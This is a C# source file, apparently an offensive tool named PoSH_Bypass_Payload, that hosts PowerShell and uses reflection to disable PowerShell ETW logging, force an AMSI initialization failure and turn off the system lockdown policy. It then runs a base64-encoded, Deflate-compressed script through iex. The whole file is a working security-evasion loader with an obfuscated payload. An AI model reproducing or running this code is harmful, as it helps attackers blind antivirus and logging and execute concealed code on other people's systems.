using System;
using System.Reflection;
using System.Management.Automation;
using System.Management.Automation.Security;



//References
//  https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/
//  https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs
//  https://tyranidslair.blogspot.co.uk/2017/08/copy-of-device-guard-on-windows-10-s.html

namespace PoSH_Bypass_Payload
{
    class Program
    { 
        static void Main(string[] args)
        {

            string Payload = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAbgBWAFoAdABjADkAbwA0AEUAUAA3AHUAWAA2AEgAeAArAEEATwBlAFkAaABuAFMAaABPAFoAZwArAEoAQQA0ADUASgBLADcARQBqAGcAZwB5AGIAVQAwAGMAeQBQAHMAQgBSAFMATQA1AFUAaAB5AEMATQAzAHgAMwAyADkAbAA4ADUAYQAwAFQAVAB1AFgAeQBRAGQAcgB0AGIAdgBQADcAcgBNAHYAWQB0AGgAZgBLAGcAMQB6AGUAZwBXAGEAOQBrAEUAKwA4AGgAQwA2AGcAaQBlADYAegBSAEkAMgBBAFgAbABYAHIAeABzAHAAeQBBAEMAawA1AG0ATQBlAE0AZwAwADMATABPAFkAUgAwADEAdwBrAEEAWQB2AGoARQBRAHQAbgBwAEUAbQBlAEgAUwAwAHoAVwBGAG0ATwBDAHAAdgAyAFYATwB0AFUAMQBYADIALwArAHQAcwBCAHIAZABhAE8AYQBiAFYAQwBxADkAWAAzADkAYwBQAEQAOQB6AFkAcQB2AEgAWAB2ADgAegBuAEMASwBsADkAcABCAEEAagA5AFUAQwBRAGEARQB1ADMAYgAxAGoAaABMAFEAZwBOAEoAZwBwAE0AMgBLAFQAawB6AFcASgBhAGQAeQB4AHYAMwAyAFgASQBZAG8AbAAvAEIAdwB1AHUATQA3AGkASABVAHgAQgBzAHMAVQA3AGgAaQBjAHkARAAyAE8AcgBVACsAaABKAG4AawBlAGsAawBEAHUAVQB5ADEAbQBFAGkAVwBUAHAAZQAwAHgAKwArAFQAaQBFAEYAYwBKAEIAcABoAFkASQB5ADIAUgBRAFQAbwBiAGYAaQBtAFkAYwBEAFQASwBVAGkAagBpAHUAUQBFAHAANABFAHgANwBMAEkAbwA0AHMAbgBrAHAANwBaAHIAdgBiAFgAeABaADUAQgBDAEcAZgBQAFQAVwBJAFMAegBQAHYAOQBxAHcASwBzAEgAeAAwAGIAMABKAHkAegBYAGcAbwBPAGoAbQBzAFgASABtAEQATwBtAFMANgB6AG4AegBUAGUAZABnAEQAYQBwAGwAbAB5AGEAWgArAHYAQgBBADIAYQBzAEoAYgBxADMAagBSADcANgB1AEwAegBaAEMAeQBnAFEAQwBaAFoAUgBJACsAeQA1AEYAUABOAFQAcABxAEIAMgBXAEsAagBuAG4AbABjAFcAeABBAHIAMgA3AEYAQwA0AHMAbABZAEYARwByAEsAOQBnADgAYgBEAEwAMgBCAGoALwBMADgASQBiAHAAegB2AG8AeABlAFcAUgBtAHoAdwBIAGIAYgBhADEAYgA1ADEARgBXAHgAcQBuAHkAVwBtADkAcQBNADkAagBBAEUAOABhAGQAcABLAFEAbQBFAFkAUgBxAFQAcgB3AGYAawB4AC8AUgAzADAANgBWAEsARABLAGgAbQBEAG8AbABkAE0AQQB4AGsAZgBsAG0AUABZAFIAYwBCAEEAQQBuAFkAMQBXAHUAYQBWAGsAaQBYAFUARwA1AHMAYgBvAEEAUABKAEUAagBVAFcAYwBuADcATwBFAHgAYgBuAFYAUwBvADUAbwB6AEsAcABsAEkAawB6AG8AaAA4AGgAbQBlAGkAcABhAHcAMQBIAGkARABDADgAdQB5AE4ATwBXAGoAaABFAC8AdAA0AFIAWgAyAHgAOQBtAC8AMQBBAHYATQB3ADkAZABhADIAOQA5AE0ANQBhADIALwBRAGcAQwBWAC8AbgA5AHgAYQBIAFIAdAAxAHkAaQByAHEATgBoAGgAVgBLAHEAMABkADMATAA3AE0AMQA5AGIAUwBjAGEARAAvAGoATQA5AGoATABPAEQATQAzADAAUQA4AHoAcgB0AGIAMgBVAGkAWQBlAG4AbAAzAHIAWgA4AFIAdgBnAHMAdgBjAHYAUgB4AFIANwB0ADMAQwBLAEkAdwA1AHoAagBWAG0ARwB3AGcAeAA0ACsAQwBTADUAeQBLADQAawByAGsALwB3ACsAQwBJAGQANAA1AFIATQBFADMAcwBLAFAATABiAGIAWAArAEoAZgA3AGIAYgBLAEwAUwBHAHUASAA1AEEAOAA3AGsAWgBvAGkANgBUAEMAbABwAFAATABOAFEAbABKAHkAcgB2AGEANQBlAGQASgBJAHQAagBZAHoAUAA3AHMAWQAxADkAVQBQAEUAcgBOAGYAKwBnAFUAagAyADIAdgAyADkAZABOAEQAMwB4AFkAbwAwAEUAWQBhAEQAdwB4AFAAVwBLAEkARwBNAEsAWgBHAEsANgB2ADAAbABzADMAQgA0AHAAVQAyAG8AaABaAEwAUQA1AFMAdgBHADAAegBHAFMAOABQAGkANwBDAGwAMQB0AHEAYgArAHMAaQBHADAASABPAFIAbwBOAFkAbABqAE4AdABvAG4AbwBPAGkAVABTAHoASgBDAEkAbAA3AEIASwBGAGgAVgBmAEkAbgBtAGEAagBHAEcAagB3AHMAWABkAFQAbgBHAG0AYgAzAFEAdABKAHYASQBrAG0AQgA2ADYATABzAFMARQBPAHYAUQBBAFcANABUAFUAOQBpAGEASwBTAGYAUwBHAFUAeABsAFMAbQA2AHcAbgBqAFkALwBUAHIAUAB1AE8AUwBsAGoAegBWADkAYgAxAFYANwBKAGkATABIAHkAegBmAHgAbABZAC8AZgBHAFYAZwByADYAeAB2AEkASwArAFIARgArADkAawBnAHAAWgBJAGEARgB0ADgANQBYAEgATQAvAEMATgBhAEkAYQBWAGIAbgBrAFIAaQBvAGMAagBWAGcATgBUAG8AKwB3AGEANQA3AGQAegBXAEQAaAB0AGsASQBIAGwAawBjAEQANwBRAEMAaAA1AEUARgBrADQAYgBSAEQANwBXAHEAMQBWAGEAYwBVAG4ATQBaADQAQgBOAEUAOAA2AEUANwBYADYATAAxAFkATQB4AFMASgBBAEkAaABMAGMANQBhAHgAdgBlADgANAA1AGEAcABHACsAeAAzAGoAVwBxAE8ANAB0AHkALwBvAEsANQBXAEkAWABjADAAYgBhADgAZQBSAFcAMgA1AGMAMwA5AGQAdgB0ADkATQAxAHIARgBRAEEANgBFAGwAeQA5ADcASwBQAHAAOQBwADAAcQA4AEUAOQBXAE4ARwBVAC8ATQBnAE8AVAA5AEgAQQBKADYAZAAzAEIANQBoAGgASQBpAGgAUwA0AFMAagBFADAAVQBzAGEAawBpAHQAbgBuACsASABNADIAUgBEADgAbwB5AEwAZQBiADUATwAwAHUANwBmAFIAeABaAFEAeABKAG4ATQBkAG0ARwBWAGoAYQBCAEcASQArAEwAbABPADcAdQBqAGQAOAB0AFIAcwBOAGEAawBYAHkAMQBQAGgATgBEAEgAdABiAG0ARABNAFkAcwBpAC8AVQByAGYAWgBOADYAZwB4AFQAVgB6AEgAawB4AHcAawBXAEsAbwBvADIANQA5AFEAdgAyAE8ALwBQAFgAOABhAEIAOABUADIASwBpAHkAawBrAE8ATgA5AE4AUABYAHAAZAAyAHUARgBlAHIAQwAyAHkANQBIAGoAeABrAG8ASABTAGgAWQBoADcAZQAzAEwASwBNAHoAdwA0AG8ATQB3AHEAWABaADgAMwAxAEwAcwBFAFgASwBNADgARABRADkAKwB0AG4AVgBUAGkANQBFAHUAeQBmAHMASQBnAGUAYQB6AHYANgBtAHMAZQBMADYAYwBRAGgAbQBLAGUAWgByAHEANABjAEIAMABiAEoAeQBWAHIAMgB0AGkAdQBKADkAZQBEAGkAMAA3AHYAYwB2AEQAcABTAC8AOQBUAGYAOQBCAHEAMgB5AHYARABpAHIAbAA5ADQAUQB0AHgAUgBkAFAAZQBpAGkASQBzAEgAMAArACsATwBGAG4ARAAvAEwALwAyAFgAMABpADYAdgBVADcAUQA2AHYAYwA3AHYAWAA5AE8AZQBzAEgARgA1AGEAQQBWAEQASwA1ADcAcgBZAGEAVAA4AHEAagB4AC8AWgA5AEoAWgByAG0AawBUAGQAegA0AHgARABOADcALwBjAE4AdABTADMAVAA2AGYALwB5AHQALwBPAG4AbABnAHgALwBIAGYAdgBqAFEAZgBjAHkAcQBuAFMATgB4AEMAdQA4AHEAbQBWAHAAOABmAHAAVABMAHcAKwBWAGYAagArAGUAZgBtAHMAVABMAEUAdQBJAEkAcwA1ADEAeQBPAHQAYgA3AGQAcgBlAFAAdgBZAEoAQwA3AE8ASABVAHAAVABpAHIAUwBTAHgAWQBwAE4AWgA3AFgATABsAFcAQgBQADgATAAxAFEAUwA3AHgAagBTAGIAYwA0AHQAZQBmAEcAdwBHADEAMwB5AGIASABWAFoAOAAvAFUAcwA0AFAARwAyADYAegA4AEsAVgBKAEwAVwBuAFkAbwBDAFUAVgBJADgAcgBGAFcAdgB0AEkAOQBjAGkAcQAvADgAQQAnACkALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkA"));

            using (PowerShell powerShellInstance = PowerShell.Create())
            {
                var psEtwLogProvider = powerShellInstance.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
                if (psEtwLogProvider != null)
                {
                    var etwProvider = psEtwLogProvider.GetField("etwProvider", BindingFlags.NonPublic | BindingFlags.Static);
                    var eventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                    etwProvider.SetValue(null, eventProvider);
                }

                var amsi = powerShellInstance.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils");
                var amsifield = amsi.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
                amsifield.SetValue(null, true);

                var fi = typeof(SystemPolicy).GetField("systemLockdownPolicy", BindingFlags.NonPublic | BindingFlags.Static);
                fi.SetValue(null, SystemEnforcementMode.None);

                powerShellInstance.AddScript(Payload).Invoke();
            }
        }
    }
}


